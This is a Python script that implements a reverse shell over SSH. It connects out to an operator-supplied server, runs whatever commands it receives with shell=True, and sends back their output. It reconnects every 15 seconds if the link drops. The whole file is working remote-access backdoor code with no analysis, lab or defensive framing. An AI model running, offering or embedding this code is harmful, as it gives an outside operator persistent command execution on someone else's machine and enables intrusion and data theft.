import paramiko
import subprocess
import sys
import time
import platform
import os

#script args
server_address = sys.argv[1]
server_port = int(sys.argv[2])
username = sys.argv[3]
password = sys.argv[4]

def process_exec(client_session, command):
    try:
        command_output = subprocess.run(
            command, stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
            timeout=30
        )
        #send back the resulting output
        if len(command_output.stderr.decode('utf-8')):
            client_session.send(command_output.stderr.decode('utf-8'))
        elif len(command_output.stdout.decode('utf-8')):
            client_session.send(command_output.stdout.decode('utf-8'))
        else:
            client_session.send('Process exited without output')
    except subprocess.CalledProcessError as err:
        client_session.send(str(err))

def shell(client_session):
    while client_session.active and not client_session.closed:
        command = client_session.recv(1024).decode('utf-8').split(" ")

        if command[0] == "cd" and len(command[1]):
            path = " ".join(command[1:])
            os.chdir(path)
            client_session.send(f'Path changed to: {path}')
            return
        elif command[0] == "getpath":
            if platform.system() == "Windows":
                process_exec(client_session, "cd")
            else: process_exec(client_session, "pwd")
        elif command[0] == "exit":
            return
        else:
            process_exec(client_session, " ".join(command[0:]))

def process_commands(client_session):
    command = client_session.recv(1024).decode('utf-8').split(" ")
    if command[0] == "ping":
        client_session.send("pong")
    elif command[0] == "shell":
        shell(client_session)
    else:
        client_session.send("Command not found")

#connect to the remote ssh server and recieve commands to be #executed and send back output
def ssh_command(server_address, server_port, username, password):
    #instantiate the ssh client
    client = paramiko.SSHClient()
    #optional is using keys instead of password auth
    #client.load_host_key('/path/to/file')
    #auto add key
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    #connect to ssh server
    client.connect(
        server_address,
        port=server_port,
        username=username,
        password=password
    )
    #get ssh session
    client_session = client.get_transport().open_session()
    while client_session.active and not client_session.closed:
        process_commands(client_session)
    client_session.close()
    return

try:
    while True:
        try:
            ssh_command(server_address, server_port, username, password)
        except Exception:
            time.sleep(15)
except KeyboardInterrupt:
    sys.exit()
